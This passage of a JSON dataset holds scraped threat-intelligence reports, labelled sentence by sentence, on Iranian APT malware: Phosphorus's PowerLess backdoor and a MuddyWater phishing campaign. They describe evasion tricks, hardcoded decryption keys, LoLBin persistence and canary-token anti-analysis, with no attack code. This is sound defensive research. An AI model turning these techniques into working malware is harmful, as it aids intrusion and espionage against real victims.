{
    "data": [
        {
            "time": "2022-02-01",
            "from_website": "Cybereason",
            "title": "PowerLess Trojan: Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage",
            "from_url": "https://www.cybereason.com/blog/powerless-trojan-iranian-apt-phosphorus-adds-new-powershell-backdoor-for-espionage",
            "content": [
                "PowerLess Trojan: Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage",
                "PowerLess Trojan: Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage",
                "Over the past months, the Cybereason Nocturnus Team observed an uptick in the activity of the Iranian attributed group dubbed Phosphorus (AKA Charming Kitten, APT35), known for previously attacking medical research organizations in the US and Israel in late 2020, and for targeting academic researchers from the US, France, and the Middle East region back in 2019.",
                "They have also previously targeted human rights activists, the media sector, and interfered with the US presidential elections.",
                "Towards the end of 2021, multiple attacks were carried out exploiting the notorious Microsoft Exchange Server vulnerabilities chained together and referred to as ProxyShell, which ultimately enabled multiple threat actors to deploy malware on their targets’ networks.",
                "There have been several reports detailing the exploitation of these vulnerabilities by Iranian state sponsored threat actors, among them the Phosphorus APT group carrying out ransomware attacks.",
                "Cybereason researchers recently discovered a new set of tools which were developed by the Phosphorus group and incorporated into their arsenal, including a novel PowerShell backdoor dubbed PowerLess Backdoor.",
                "Our research also highlights a stealthy technique used by the group to avoid PowerShell detection by running the PowerShell Backdoor in a .NET context rather than spawning the PowerShell process.",
                "In addition, several interesting connections were found between the Phosphorus group and the Memento Ransomware that first emerged in late 2021.",
                "(Related Iranian APT research: StrifeWater RAT: Iranian APT Moses Staff Adds New Trojan to Ransomware Operations).",
                "Novel PowerShell Backdoor: A novel and previously undocumented PowerShell backdoor related to the Phosphorus group was discovered by the Cybereason Nocturnus Team and dubbed PowerLess Backdoor.",
                "It supports downloading additional payloads, such as a keylogger and an info stealer.",
                "Evasive PowerShell Execution: The PowerShell code runs in the context of a .NET application, thus not launching “powershell.exe” which enables it to evade security products.",
                "Modular Malware: The toolset analyzed includes extremely modular, multi-staged malware that decrypts and deploys additional payloads in several stages for the sake of both stealth and efficacy.",
                "Highly Active Infrastructure: At the time of writing this report, some of the IOCs remained active delivering new payloads.",
                "Wide Range of Open Source Tools: A lot of the activity observed involved a variety of publicly available tools, such as cryptography libraries, weaponizing them for payloads and communication encryption.",
                "Shared IOCs with Memento Ransomware: One of the IP addresses serves a domain which is being used as command and control (C2) for the recently discovered Memento Ransomware.",
                "Phosphorus Threat Group: The Phosphorus Threat Group was previously spotted attacking research facilities in multiple regions such as the US, Europe and the Middle East.",
                "The group is known to be behind multiple cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime, leveraging cyberwarfare in accordance with Iran’s geopolitical interests.",
                "Use of Publicly Available Exploits: The Phosphorus Group was first seen exploiting the ProxyShell vulnerability, and later on the Log4j vulnerability as well, utilizing fresh exploits in the wild.",
                "A Glimpse into Phosphorus Updated Arsenal",
                "Following up on both public and non-public intelligence that is available to Cybereason in regard to the Phosphorus threat actor, the Cybereason Nocturnus Team was able to identify a new toolset that includes a novel backdoor, malware loaders, a browser info stealer, and a keylogger.",
                "It is worth noting that some of the more recent methods that were observed in attacks attributed to the Phosphorus group included open-source tools such as the famous DiskCryptor library and also BitLocker, along with the Fast Reverse Proxy which is used for RDP proxying.",
                "The following sections will detail the discovery process and analysis of the newly identified tools.",
                "Pivoting from a Previously Known Arsenal",
                "The journey to the discovery of the new toolset started with threat intelligence efforts that included pivoting on an IP address (162.55.136[.]20) that was already attributed to Iranian threat actors by multiple sources, including US CERT.",
                "While examining different files that were downloaded from this IP address, we stumbled upon a file named “WindowsProcesses.exe”:",
                "WindowsProcesses.exe hosted on the abovementioned IP",
                "The file seems to have only been detected by 35/68 antivirus vendors, according to VirusTotal:",
                "WindowsProcesses.exe details as seen in VirusTotal",
                "This file, entitled “WindowsProcesses.exe” is a 64-bit executable loader whose sole purpose is to resolve relevant DLLs and load another file from the “%windir%\\Temp” path entitled “dll.dll”:",
                "WindowsProcesses and related modules execution diagram",
                "Once the relevant DLLs (mostly related to .NET runtime libraries) and API calls are resolved, dll.dll is executed:",
                "By the looks of it, the authors could have been inspired by a code snippet found publicly available on GitHub, which facilitates running PowerShell with CLR in native runtime.",
                "The snippet is named “Powerless”, and the authors seem to have kept that naming convention, as shown in the PDB path of the binary:",
                "Dll.dll is a simple .NET AES decryptor that uses a hardcoded key “()*&3dCfabE2/123” to decode another file named “upc” to ultimately execute PowerShell code from the decrypted object:",
                "The upc encrypted BLOB is decrypted using dll.dll, and contains multiple encryption layers that all are decrypted in stages using base64 and AES ECB decryption.",
                "The keys that are being used for decryption are as follows:",
                "Prior to decrypting the PowerShell backdoor, an intermediate stage takes place when the victim’s machine is assigned a unique identifier which is sent to the C2, which downloads an additional configuration:",
                "The intermediate stage during the PowerLess backdoor decryption",
                "After all the AES encrypted layers are decrypted, the PowerLess backdoor is executed:",
                "PowerLess backdoor command parsing code segment",
                "The PowerLess backdoor is equipped with the following capabilities:",
                "Downloading and executing additional malware and files",
                "It is worth mentioning that the backdoor is being run within a .NET context, so therefore it does not spawn “powershell.exe”.",
                "This behavior can be interpreted as an attempt to evade certain PowerShell detections, although PowerShell logs are being saved on the machine:",
                "Windows Processes and the malicious loaded module “dll.dll” as seen in the Cybereason XDR Platform",
                "Oddly enough, there is a part of the code in the PowerLess Backdoor, that do spawn a powershell.exe process, when the request to kill a process is received from the C2:",
                "A part of the PowerLess Backdoor that spawns powershell.exe",
                "It can be assumed that the native language of the backdoor’s authors is likely not English given the abundance of typos and grammatical mistakes found in the code:",
                "One of the modules downloaded by the PowerLess backdoor is a keylogger that is written in .NET.",
                "It’s core functionality is quite simple, consisting of hooks and the logging of the user’s keystrokes:",
                "Partial code from the keylogger module",
                "The logs are being stored in the following path: \"C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK\":",
                "Logs path of the keylogger module",
                "Another module is a browser info stealer, which is also written in .NET, and includes the BouncyCastle crypto library.",
                "It also uses an SQLite data reader object for Chrome and Edge browser database files.",
                "In the staging phase, the data is encrypted and written in JSON format for exfiltration:",
                "Partial code from the info stealer module",
                "The logs are being stored in the following path: “C:\\\\Windows\\\\Temp\\\\cup.tmp”:",
                "Logs path of the stealer module",
                "Additional Tools Potentially Related to Phosphorus",
                "In addition to the newly discovered PowerLess Backdoor, other tools were identified by the Nocturnus Team which are suspected to originate from the same developer.",
                "However, at this point in time there isn't enough evidence to conclusively tie these tools to Phosphorus with a high level of confidence.",
                "Looking at the PE info of “WindowsProcesses.exe”, the below PDB path is present: “C:\\Users\\pugna\\Desktop\\126\\V1\\PowerLessCLR\\x64\\Release\\PowerLessCLR.pdb”:",
                "Searching for the prefix “C:\\Users\\pugna” returns other unidentified tools:",
                "Artifacts found in VirusTotal with the search “C:\\Users\\pugna”",
                "“Chromium F.exe” is yet another .NET browser info stealer.",
                "Although the code is different, by the functionality it is similar to the abovementioned info stealer module, leading us to assess that it might be an earlier variant:",
                "“Sou.exe” is another .NET file, but this time it’s an audio recorder which uses the NAudio open source library:",
                "A New Locker in the Making?",
                "One of the more recent tools that was allegedly from the same developer is what appears to be an unfinished Ransomware variant.",
                "It is also written in .NET and at this point doesn’t do anything except locking the target’s screen.",
                "As can be seen, the fields like the ransom amount and attacker’s email are yet to be set.",
                "Although unfinished, it is worth mentioning that the sample was uploaded from Iran via web, and it might imply yet another step in the direction of this threat actor towards ransomware:",
                "Unfinished ransomware sample uploaded to VirusTotal from Iran",
                "One of the more active IPs that was reported in the ProxyShell attacks was 148.251.71[.]182.",
                "In addition, another recent report mentions this IP address as part of an active exploitation of the Log4j vulnerability:",
                "Files found on the IP address 148.251.71[.]182",
                "The “symantec” and “update” themed files all serve the FRP again.",
                "The “RCE” links, on the other hand, serve a Java loader that distinguishes the victim machine’s operating system and drops the appropriate version of FRP:",
                "There are two slightly different variations of the loader, but eventually they check for the file separator of the OS, which is “/” in case it’s Linux or “\\” in Windows, and then downloads the payload and creates persistence:",
                "Content of the malicious Java class",
                "Another loader which eventually delivers FRP is PowerShell code converted to an executable by the “Ps1 To Exe” freeware that is available for download on public forums, where less technical people can successfully use it:",
                "Information about one of the FRP loaders",
                "Finally, the loader creates a scheduled task for FRP, of course while being dependent on the OS type.",
                "A full process tree of a real time attack that exploits the ProxyShell vulnerability and deployment of the FRP modules, can be seen below:",
                "A real time FRP staging and execution as seen in the Cybereason XDR Platform",
                "Once the attackers exploited the vulnerable Microsoft Exchange Server, they downloaded the FRP module, ran multiple reconnaissance commands, created persistence, dumped credentials using a known LOLBIN technique (Comsvcs.dll), and attempted to move laterally, as can be seen in the above Cybereason XDR Platform image.",
                "Another IP that appears in US CERT’s list is 91.214.124[.]143.",
                "Searching it in VirusTotal reveals other malicious files communicating with it, as well as unique URL directory patterns that reveal a potential connection to Memento Ransomware:",
                "The string “gsdhdDdfgA5sS” appears to be generated by the same script as the one listed in the Memento Ransomware IOCs: “gadfTs55sghsSSS”.",
                "]ml” was previously resolved to the IP address 91.214.124[.]143 mentioned in the US CERT alert about Iran state sponsored actors activity:",
                "Some of the Memento IOCs that are suspected to be related to Phosphorus",
                "The “Connector3.exe” naming convention: as mentioned above, Phosphorus has been observed using the FRP tool in many occasions.",
                "The file name that is used for FRP and reported by the US CERT is “Connector3.exe”.",
                "As can be seen below, the same name is being used to name a backdoor by Memento:",
                "FRP named “Connector3.exe” from US CERT report",
                "The activity of Phosphorus with regard to ProxyShell took place in about the same time frame as Memento.",
                "Iranian threat actors were also reported to be turning to ransomware during that period, which strengthens the hypothesis that Memento is operated by an Iranian threat actor.",
                "In this report, the Cybereason Nocturnus Team detailed a previously undocumented PowerShell backdoor dubbed PowerLess, used by the Iranian APT Phosphorus in recent attacks.",
                "This research also provided further details regarding the group’s tools and techniques, including the use of publicly available tools and a combination of coding languages.",
                "The extensive usage of open source tools that is assessed to demonstrate the intermediate coding skills of the attackers.",
                "The use of various programming languages also might point to a lack of specialization in any specific coding language.",
                "This research also highlights how important it is for threat intelligence analysts to “follow the breadcrumbs,” such as pivoting on known infrastructure or the PDB paths left by the attackers in this case, in order to pave the way for discovering additional tools and connections to other operations.",
                "Finally, a connection between Phosphorus and the Memento ransomware was also found through mutual TTP patterns and attack infrastructure, strengthening the connection between this previously unattributed ransomware and the Phosphorus group.",
                "The Cybereason XDR Platform detects and blocks the PowerLess Trojan and other advanced TTPs used in this operation.",
                "Cybereason is dedicated to teaming with defenders to end attacks on the endpoint, across enterprise, to everywhere the battle is taking place.",
                "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
                "Impair Defenses: Disable or Modify System Firewall",
                "Daniel Frank is a senior Malware Researcher at Cybereason.",
                "Prior to Cybereason, Frank was a Malware Researcher in F5 Networks and RSA Security.",
                "His core roles as a Malware Researcher include researching emerging threats, reverse-engineering malware and developing security-driven code.",
                "Frank has a BSc degree in information systems.",
                "The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe.",
                "They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities.",
                "The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.",
                "Get the latest research, expert insights, and security industry news."
            ],
            "sentencesNum": 118,
            "words": [
                "Back to Cybereason.com",
                "Research",
                "Podcasts",
                "Webinars",
                "Resources",
                "Videos",
                "News",
                "Subscribe",
                "Subscribe",
                "Research",
                "Podcasts",
                "Webinars",
                "Resources",
                "Videos",
                "News",
                "Search",
                "Subscribe",
                "X",
                "Search",
                "February 1, 2022 |",
                "8 minute read",
                "Written By",
                "Cybereason Nocturnus",
                "Key Findings",
                "Analysis of WindowsProcesses.exe",
                "The main code of WindowsProcesses.exe",
                "C:\\\\Users\\\\pugna\\\\Desktop\\\\126\\\\V1\\\\PowerLessCLR\\\\x64\\\\Release\\\\PowerLessCLR.pdb",
                "Analysis of dll.dll",
                "The code of dll.dll",
                "upc",
                "()*&3dCfabE2/123",
                "0123654789mkiujn",
                "25sL(*14@#SDFcgd",
                "Analysis of the PowerLess Backdoor",
                "Additional modules:",
                "Browsers info stealer",
                "Keylogger module",
                "Encrypted channel with the C2",
                "Executing arbitrary commands",
                "Killing processes",
                "Stealing browser data",
                "Keylogging",
                "PowerLess backdoor logging",
                "Keylogger",
                "Stealer",
                "The PDB path from WindowsProcesses.exe",
                "Chromium F",
                "Code segment from Chromium F.exe",
                "Sou.exe - Audio Recorder",
                "Code segment from Sou.exe",
                "The unfinished ransomware locker screen",
                "Analysis of FRP Loaders",
                "Java Multi Platform Loader",
                "The Java RCE class",
                "Powershell to Exe Downloader",
                "The Memento Ransomware Connection",
                "Conclusion",
                "MITRE ATT&CK BREAKDOWN",
                "Reconnaissance",
                "Execution",
                "Persistence",
                "Defense Evasion",
                "Gather Victim Host Information",
                "Command and Scripting Interpreter: PowerShell",
                "Masquerading",
                "Gather Victim Identity Information",
                "Exploitation for Client Execution",
                "Scheduled Task/Job: At (Windows)",
                "Scheduled Task/Job: At (Windows)",
                "Scheduled Task/Job: At (Linux)",
                "Modify Registry",
                "Scheduled Task/Job: At (Linux)",
                "Server Software Component: Web Shell",
                "Discovery",
                "Collection",
                "Command and Control",
                "Credential Access",
                "Account Discovery: Local Account",
                "Archive Collected Data",
                "Application Layer Protocol: Web Protocols",
                "OS Credential Dumping",
                "Audio Capture",
                "Data Encoding: Standard Encoding",
                "Input Capture: Keylogging",
                "Encrypted Channel: Symmetric Cryptography",
                "Proxy",
                "About the Researcher:",
                "DANIEL FRANK",
                "X",
                "Indicators of Compromise | PowerLess",
                "IPs",
                "91.214.124[.]143",
                "162.55.137[.]20",
                "162.55.136[.]233",
                "148.251.71[.]182",
                "Files",
                "WindowsProcesses.exe",
                "679703e9859c20ab39d6be992aa7d979710d9ace",
                "dll.dll",
                "3fcec932530557ea3d1f38f06f477db4b0be5acb",
                "upc",
                "97c0e103700b9f2464000cb63e10b68a4305dd33",
                "Keylogger module",
                "4810c782a8fe964512f08db91e8107e9af29edab",
                "Stealer module",
                "3bfec62c094366844c3e4c0e257e01678f55ef5b",
                "Sou.exe",
                "0492b9ad7ae35ee1e0b6f53a6b7c2c75e9b5d427",
                "Chromium F.exe",
                "dd94382acb55e694ee38e1be7f5c0902be0e0d89",
                "Rsf.exe",
                "416291332a70407df5ff5d79072f5ad68cd802b9",
                "Java loaders",
                "026db4159e7e36e00fdcef1e29f73b40030a3572",
                "dcf01d7641ec3fec213ab8335625a3554b943ac8",
                "92ae97557e18ca810999fc05c18e3c6c75476444",
                "eeebce1a4c3e05e21689acef000a5fcf0f17abc3",
                "task_update.exe",
                "32224892b670467e23874d7e8abd2ef92987a7e6",
                "3a6431169073d61748829c31a9da29123dd61da8",
                "PDBs",
                "\"C:\\Users\\pugna\\Desktop\\126\\V1\\PowerLessCLR\\x64\\Release\\PowerLessCLR.pdb\"",
                "“C:\\Users\\pugna\\Desktop\\126\\V1\\slns\\dll\\dll\\obj\\Release\\dll.pdb”",
                "“C:\\Users\\pugna\\Desktop\\Sou\\Sou\\bin\\x64\\Release\\s.pdb”",
                "“C:\\Users\\pugna\\Documents\\Gatherer\\Chromiom F\\obj\\Release\\Chromiom F.pdb”",
                "“C:\\Users\\pugna\\Desktop\\RS\\rsf\\rsf\\obj\\Debug\\rsf.pdb”",
                "“C:\\Users\\Injec\\Desktop\\myklg-without-mouse-with timee\\myklg\\obj\\Release\\myklg.pdb”",
                "“C:\\Users\\Injec\\Desktop\\pro4-finaly\\pro4\\bin\\Release\\ILMerge\\pro4.pdb”",
                "About the Author",
                "Cybereason Nocturnus",
                "All Posts by Cybereason Nocturnus",
                "Related Posts",
                "NEWSLETTER",
                "Never miss a blog",
                "Subscribe",
                "About",
                "Who We Are",
                "Careers",
                "Leadership",
                "Contact",
                "Resources",
                "Blog",
                "Case Studies",
                "Webinars",
                "White Papers",
                "Platform",
                "Overview",
                "Endpoint Protection",
                "EDR",
                "MDR",
                "©Cybereason 2021.",
                "All Rights Reserved.",
                "Terms of Use",
                "Privacy Notice",
                "Security"
            ],
            "wordsNum": 155,
            "labels": [
                "good",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "good",
                "bad",
                "good",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "good",
                "bad",
                "bad",
                "bad",
                "bad",
                "good",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "good",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "bad",
                "good",
                "bad",
                "bad",
                "bad",
                "good",
                "good"
            ]
        },
        {
            "time": "2022-01-31",
            "from_website": "CISCO",
            "title": "Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables",
            "from_url": "https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html",
            "content": [
                "Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables",
                "Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables",
                "By Asheer Malhotra and Vitor Ventura.",
                "Cisco Talos has observed a new campaign targeting Turkish private organizations  alongside governmental institutions.",
                "Talos attributes this campaign with high confidence to MuddyWater — an APT group recently attributed to Iran's Ministry of Intelligence and Security (MOIS) by the U.S. Cyber Command.",
                "This campaign utilizes malicious PDFs, XLS files and Windows executables to deploy malicious PowerShell-based downloaders acting as initial footholds into the target's enterprise.",
                "MuddyWater's use of script based components such as obfuscated PowerShell based downloaders is also a tactic described in the advisory from January 2021 by the U.S. Cyber Command.",
                "This campaign also utilizes canary tokens to track successful infection of targets, a new addition to this group's arsenal of tactics, techniques and procedures (TTPs).",
                "This specific method of taking advantage of canary tokens in this campaign may also be a measure to evade sandbox based detection systems.",
                "A highly motivated threat actor such as MuddyWater can use unauthorized access to conduct espionage, intellectual property theft and deploy ransomware and destructive malware in an enterprise.",
                "MuddyWater has conducted various campaigns against entities spread throughout the U.S.A, Europe, Middle East and South Asia.",
                "A typical TTP employed by the group is the heavy use of scripting in their infection chains using languages like PowerShell and Visual Basic coupled with the frequent use of living-off-the-land binaries (LoLBins).",
                "Cisco Talos recently observed a campaign operated by MuddyWater targeting users in Turkey.",
                "This campaign consists of the use of malicious PDFs and Microsoft Office documents (maldocs) to serve as the initial infection vector.",
                "These maldocs were named in such a way as to masquerade as legitimate documents from the Turkish Health and Interior Ministries.",
                "Next, the malware executes a series of scripts deployed on the infected endpoint to serve as downloaders and instrumentors for additional payloads.",
                "We've also discovered the use of flags or tokens in attacks conducted by this threat actor in this campaign.",
                "These tokens are meant to signal a successful infection of a target by the group's malicious artifacts.",
                "MuddyWater, also known as MERCURY or Static Kitten, is an APT group recently attributed to Iran's Ministry of Intelligence and Security (MOIS) by U.S. Cyber Command.",
                "This threat actor, active since at least 2017, frequently conducts campaigns against high-value targets in American, European and Asian countries.",
                "Campaigns carried out by the threat actor aim to achieve either of three outcomes:",
                "Espionage  - Supporting the political dominance of the nation state in the Middle East.",
                "This is business as usual for the threat actor, motivated by nation-state interests.",
                "Intellectual property theft - Enables economic advantages to the nation state.",
                "This goal is accomplished by carrying out aggressive campaigns against private entities and government affiliated institutions such as universities and research entities.",
                "Ransomware attacks - MuddyWater has previously attempted to deploy ransomware such as Thanos on victim networks to either destroy evidence of their intrusions or disrupt operations of private organizations.",
                "This group frequently relies on the use of DNS as part of their means to contact the command and control (C2), while the initial contact with hosting servers is done via HTTP.",
                "Their initial payloads usually use PowerShell and Visual Basic scripting along with LoLBins to assist in the initial stages of the infection.",
                "Talos recently observed a campaign operating as recently as November 2021, which we attribute with high confidence to the MuddyWater group, targeting Turkish government entities, including the Scientific And Technological Research Council of Turkey — Tubitak.",
                "This campaign consisted of the use of malicious excel documents (XLS maldocs) and executables stored on a file hosting domain \"snapfile[.]org\", which would be delivered to the victims in the form of PDF documents with embedded links.",
                "These maldocs, hosted on attacker-controlled or public media-sharing websites are downloaded by malicious PDFs meant to trick the targets into downloading and opening the maldocs.",
                "Based on historic evidence of similar campaigns conducted by MuddyWater, it is highly likely that these PDFs served as the initial entry points to the attacks and were distributed via email messages as part of spear-phishing efforts conducted by the group.",
                "Talos identified a set of malicious Microsoft Excel spreadsheet files distributed with Turkish language names.",
                "Some of these files were named to masquerade as legitimate documents from the Turkish Health and Interior Ministries.",
                "Another file discovered was called \"Teklif_form_onaylı.xls,\" which can be translated to \"Offer_form_approved.xls\" from Turkish.",
                "Analysis of the maldocs deployed in this campaign demonstrates a clear evolution of their implementation culminating into versions that are fully obfuscated.",
                "The documents have some subtle changes — almost like different versions — were being tested.",
                "Older documents had some information in the document's metadata, such as the title field \"Sayyid\"' and author name \"Aurelia\".",
                "These initial versions also consisted of an un-obfuscated PowerShell payload in the document's comments fields.",
                "Subsequent iterations of the maldocs saw progressive obfuscation of various malicious code blocks.",
                "Now, the maldocs consist of malicious VBA macros meant to instrument the infection chain.",
                "Overall, the macro contained in all the maldocs accomplished the same set of functionalities without any major evolutions as described below.",
                "The infection chain instrumented by the VBA macros consist of creating three key artifacts on the infected endpoint:",
                "Malicious VB script intermediate component that the macro sets up for persistence.",
                "Malicious PowerShell-based downloader script: The actual post-infection, payload instrumentor used for executing arbitrary code on the infected endpoint.",
                "The VB script's persistence is set up by creating a malicious Registry Run for the infected user:",
                "This campaign relies on the use of a LoLBin to execute the malicious VBScript.",
                "In some instances, the attackers make use of a LoLBin DLL called pcwutl.dll, which is part of the operating system, to execute the VBScript on reboot or re-login.",
                "Although the usage of LoLBins is fairly common as a means of lateral movement, it is not commonly used to execute the malicious payload.",
                "As the maldocs were evolving, some of the metadata details were removed or generalized, and eventually, the latest versions consisted of obfuscated PowerShell payloads residing in the comments field.",
                "The malicious VBA macros consisted of the same set of functionalities for creating the malicious VBS and PS1 scripts, and achieving persistence across reboots.",
                "However, there was one interesting addition to the macro functionality now.",
                "The latest versions of the VBA code deployed could make HTTP requests to a canary token from canarytokens.com.",
                "Canary tokens are tokens that can be embedded in objects like documents, web pages and emails.",
                "When that object is opened, an HTTP request to canarytokens.com is generated, alerting the token's owner that the object was opened.",
                "The canary token is typically silently executed twice during the execution of the macro.",
                "In cooperation with Canarytokens.com, a list of other tokens created by the same user was added to the IOC section below.",
                "An attacker may use such tokens to serve one or more purposes such as:",
                "Tracking Tokens: A way of tracking who is detonating the malicious code, keeping track of successful infections.",
                "Tracking tokens can be an anti-analysis method.",
                "In this campaign, the server that hosts the final payload may only deliver if it first receives two almost simultaneous requests to the token.",
                "This would thwart researchers that solely request the payload from the server without registering with the canary tokens using an HTTP request.",
                "Tracking tokens may also be used as another means of anti-analysis: timing checks.",
                "The infection chain consists of a PS1-based downloader and two sets of HTTP requests for the canary tokens.",
                "A reasonable timing check on the duration between the token requests and the request to download a payload can indicate automated analysis.",
                "Automated sandboxed systems would typically execute the malicious macro generating the token requests.",
                "A sandbox would also identify the creation of the registry Run key and re-login the infected user to execute the malicious PS1 that generates the request to download the next payload.",
                "Typically, since sandbox-based analysis systems spin up analysis environments for a limited number of minutes, the token requests and payload requests wouldn't be too far apart from each other temporally.",
                "A substantially low interval between the HTTP token requests and PS1 requesting the payload may indicate automated analysis of the maldocs and can be used to block payload requests from the infected endpoint.",
                "Tracking tokens can also be a method to detect the blocking of the payload server.",
                "If they keep receiving requests to the token but not to the payload server, that is an indication of their payload server being blocked, and by whom.",
                "The VBS file is a straightforward executor of the PowerShell script dropped by the macro to disk.",
                "VBS executing the PS1 on the endpoint.",
                "The PowerShell script deployed in the attack is meant to download and execute the next payload (also a PS1 script) on the infected endpoint.",
                "This PS1 script resides in the metadata of the maldoc and is dropped by the macro.",
                "Primitive versions of the maldocs consisted of unobfuscated versions of the PS1 script, with obfuscations being introduced in newer versions.",
                "The PowerShell script that downloads another PowerShell from a remote location which will then be executed.",
                "It tries twice, with a custom timeout of 40 seconds and a custom user agent, which is appended with the character \"|\" separator and the username executing the script.",
                "In other versions of script, the \"|\" character is not appended.",
                "The fact that the downloader script attempts the download of the payload twice with a big timeout further indicates that the canarytokens serve the purpose of anti-analysis.",
                "That is, the C2 may need more time to check if the canarytokens have been accessed before it delivers the final payload.",
                "We could not obtain the final payload, but our tests indicate that there was some kind of verification process being performed prior to the delivery of the payload.",
                "The delivery mechanism for this campaign is the distribution of PDF files containing embedded links.",
                "Talos found at least two PDF files which shared the same author name, \"nejla\" , in the metadata.",
                "The PDF files typically show an error message and ask the user to click on a link to resolve the issue and display the correct format/extension of the document.",
                "Once the victim clicks on the download button, the endpoint receives a second stage, which can be either a malicious XLS file or a Windows executable that proceeds with the infection as described earlier.",
                "The maldoc-based infection chain is as follows:",
                "The initial delivery mechanism of the infection chains consists of the malicious PDF files as the first stage.",
                "The URLs corresponding to the download button in the PDF files will typically host the malicious XLS files containing the macros that deploy the subsequent VBS and PS1 scripts.",
                "We have, however, recently observed a variation of this infection chain.",
                "This second variation consists of the PDF pointing to a URL that delivers a Windows executable (EXE) in the infection chain instead of the malicious XLS files.",
                "The EXEs are meant to instrument a similar infection chain consisting of the intermediate VBS and final PS1-based downloaders.",
                "The EXEs typically use a Turkish name indicating that they can either be delivered via the malicious PDFs or distributed independently.",
                "One example of an executable was named \"Surec_No_cc2021-pdf377811f-66ad-4397-bd35-3247101e2fda-eta332018.exe\" which can be translated from Turkish as \"Period_No_<...>32018.exe.\"",
                "Once executed, the sample drops a text file in the victim's temporary folder.",
                "This is actually a decoy PDF or Office document in hex format.",
                "During execution, the hex representation of the decoy document is hexlified to create a readable copy in the %temp% folder.",
                "The decoy will then be opened by the system PDF or document reader and displayed to the victim.",
                "One of the decoy documents used in the EXE based threat vector with similar content to the initial PDF files distributing the maldocs and EXEs.",
                "Once the decoy document has been displayed to the victim, the executable starts its main malicious task: Downloading and executing malicious PowerShell scripts served to it by a remote location.",
                "Here, we see that the intermediate VBS scripts used in the maldoc based infection chain have been replaced with a PowerShell-based implementation.",
                "The implant will first create a directory in the user's home folder.",
                "This directory will be used to store two PowerShell scripts:",
                "Instrumentor script used to activate the next stage from disk called \".CloudCache.conf.\"",
                "Downloader script used to download the next stage from a remote location for execution on the endpoint called \".CloudDrive.conf.\"",
                "Just like maldoc-based infections, a registry key is created at HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN | <Some Application Name> for persistence.",
                "The registry Run key takes advantage of lolbins to run the payload.",
                "In this case, it uses SyncAppvPublishingServer.vbs to execute PowerShell code, which will execute the code stored in the instrumentor script (\".CloudCache.conf\"):",
                "The instrumentor script is responsible for base64 decoding the contents of the downloader (the second PS1 script) and executing it on the endpoint.",
                "Contents of the instrumentor PS1 .CloudCache.ps1.",
                "The second PS1 script is the actual downloader of the next stage of PowerShell code that is run on the infected endpoint.",
                "It downloads the next stage of PowerShell code from a remote location and executes it on the infected endpoint.",
                "Unfortunately, there was no way for us to download the final payload.",
                "Another version of the executable deployed by the attacker in August 2021 targeted Pakistani entities.",
                "We are unsure at this time whether the November 2021 targeting of Turkish users is a continuation of this Pakistan-related activity.",
                "This executable again consists of a decoy document presented to the victim followed by the instrumentation of a PowerShell-based downloader script.",
                "This executable also uses the Registry run key for persistence of its artifacts on the system.",
                "However, in this case, we saw a variation in the infection chain:",
                "The attackers skipped using the instrumentor PS1 script as seen in the latest infection chain (described above).",
                "Instead, the attackers configured the Registry run key to execute the downloader script directly via SyncAppvPublishingServer.vbs.",
                "The downloader script used in this instance consists of capabilities to collect preliminary data, such as the computer name, to register the infection with the C2 server.",
                "The script will then reach out to the C2 for requesting PowerShell commands to execute.",
                "The response received is parsed by the implant to check if the computer name sent back by the C2 matches the current computer name.",
                "If a match is found, the corresponding PowerShell commands issued by the C2 are executed on the endpoint and the output/response is AES encrypted and returned to the C2.",
                "The URL for returning the output of a command executed on the system is:",
                "The User Agent used for all these communications is: Googlebot/2.1 (+http://www.google.com/bot.html)",
                "We observed the decoy documents reaching out to a remote location:",
                "Similar URLs on this server were accessed in previously observed MuddyWater campaigns targeting Pakistan.",
                "It is highly likely that the attackers used this server as a token tracker to monitor successful infections in this campaign.",
                "This token tracking system was then later migrated to CanaryTokens in September 2021 in the attacks targeting Turkey using the malicious Excel documents (illustrated earlier).",
                "Another example of a similar executable used by the threat actor in June 2021 was one to target the telecommunications sector in Armenia.",
                "The decoy document displayed to the victim in this case consists of an internal guide (Maintenance Operation Protocol (MOP)) for Armenia's Viva-MTS telecom solution provider from Ericsson pertaining to their Smart Services Routers (SSRs) and Evolved Packet Gateway (EPG).",
                "Decoy document used while targeting Telecom entities.",
                "What's interesting is that the decoy document was created on June 6, 2021 and modified on June 8.",
